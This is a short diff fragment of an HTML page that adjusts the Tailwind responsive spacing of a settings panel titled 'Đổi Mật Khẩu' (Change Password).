                                 <span class="w-8 h-8 rounded-lg bg-yellow-500/20 flex items-center justify-center">👑</span>
@@ -647,9 +748,9 @@
                 </div>
 
                 <!-- VIEW: SETTINGS -->
-                <div id="view-settings" class="hidden max-w-2xl mx-auto mt-10 fade-in">
-                    <div class="glass p-8 rounded-2xl shadow-2xl border-t-4 border-purple-500">
-                        <h3 class="text-xl font-bold mb-8 text-white flex items-center gap-3">
+                <div id="view-settings" class="hidden max-w-2xl mx-auto mt-4 md:mt-10 fade-in pb-20">
+                    <div class="glass p-6 md:p-8 rounded-2xl shadow-2xl border-t-4 border-purple-500">
+                        <h3 class="text-xl font-bold mb-6 md:mb-8 text-white flex items-center gap-3">
                             <span class="w-8 h-8 rounded-lg bg-purple-500/20 flex items-center justify-center text-purple-400">🔒</span>
                             Đổi Mật Khẩu
                         </h3>
